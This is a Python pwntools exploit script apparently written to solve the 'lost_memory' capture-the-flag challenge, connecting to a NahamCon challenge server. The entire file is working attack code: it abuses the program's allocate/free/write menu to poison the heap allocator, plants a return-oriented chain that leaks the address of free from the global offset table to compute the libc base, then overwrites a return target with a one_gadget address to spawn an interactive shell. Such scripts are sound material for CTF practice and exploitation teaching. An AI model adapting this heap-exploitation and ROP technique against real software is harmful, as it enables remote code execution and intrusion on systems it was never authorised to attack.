#!/usr/bin/env python3

from pwn import *

exe = ELF("lost_memory_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        io = process([exe.path])

#b *(vuln+283)
#b *(vuln+468)
#b *(vuln+133)
#b *0x004014ec
        #gdb.attach(io, '''
        #b *0x00401759
        #''')
    else:
        #nc challenge.nahamcon.com 30757
        io = remote("challenge.nahamcon.com", 30757)

    return io


io = conn()

def malloc(sz):
    io.sendline(b'1') # alloc
    io.sendline(f'{sz}'.encode())

def idx(i):
    io.sendline(b'3') # select 1
    io.sendline(f'{i}'.encode())

def free():
    io.sendline(b'4') # free

def leak():
    io.sendline(b'5') # store flag
    io.recvuntil('return value: ')
    l = io.recvline()
    log.info(l)
    return l

def write(b):
    io.sendline(b'2') # write
    io.sendline(b)

def write_rel(off, b, base):
    idx(base)
    malloc(128)
    idx(base+1)

    malloc(128)
    idx(base)
    free()

    idx(base+1)
    free()

    l = int(leak(), 16)
    addr = l + off
    write(p64(addr))

    idx(base+2)
    malloc(128)

    idx(base+3)
    malloc(128)

    write(b)
    return l


def main():

    pop_rdi = 0x000000000040132e # pop rdi; ret;


    write_rel(0x20,
              flat([
                  p64(pop_rdi),
                  p64(exe.got['free']),
                  p64(exe.symbols['puts']),
                  p64(exe.symbols['main'])
              ]), 0)
    io.sendline(b"6")
    io.recvuntil('Exiting...\n')
    free_got = u64(io.recvn(8)) & 0xffffffffffff
    log.info(hex(free_got))

    off = 0x22000
    libc_base = free_got - 0x786d0
    one_g0 = (0xe3afe+libc_base) - off
    one_g1 = (0xe3b01+libc_base) - off


    write_rel(0x20, flat([p64(one_g1)]), 0)
    io.sendline(b"6")

    io.interactive()

if __name__ == "__main__":
    main()
